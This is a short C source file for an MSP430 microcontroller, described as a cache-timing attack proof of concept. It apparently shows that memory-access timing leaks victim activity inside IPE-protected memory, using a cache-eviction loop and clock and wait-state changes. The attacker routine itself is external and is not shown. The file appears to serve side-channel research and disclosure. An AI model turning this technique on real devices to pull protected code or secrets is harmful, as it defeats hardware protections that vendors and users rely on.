/**
 * Cache attack PoC: show a difference in timing of a memory access depending on victim activity.
 *
 * After launching the debug session, do a hard reset (to activate IPE), then run the code.
 *
 * Expected output:
 * ----------------
 * Timing at low clock speed: 5, 5
 * Timing with cache delay:   6, 5
 */

#include <msp430.h> 
#include <stdio.h>
#include <stdint.h>

void attacker(void);
extern uint16_t res1;
extern uint16_t res2;

int evict(void) {
    int i;
    int dummy = 0;
    for (i = 0; i < 200; ++i) {
        dummy += *((int *) 0x5500 + i);
    }
    return dummy;
}

int main(void)
{
    WDTCTL = WDTPW | WDTHOLD;   // stop watchdog timer

    attacker();

    printf("Timing at low clock speed: %d, %d\n", res1, res2);

    CSCTL0_H = PMMPW_H;
    FRCTL0 = FRCTLPW | NWAITS_1;
    CSCTL1 = DCORSEL | DCOFSEL_4;
    CSCTL3 = DIVS_0 | DIVM_0;

    attacker();

    printf("Timing with cache delay:   %d, %d\n", res1, res2);

    return 0;
}
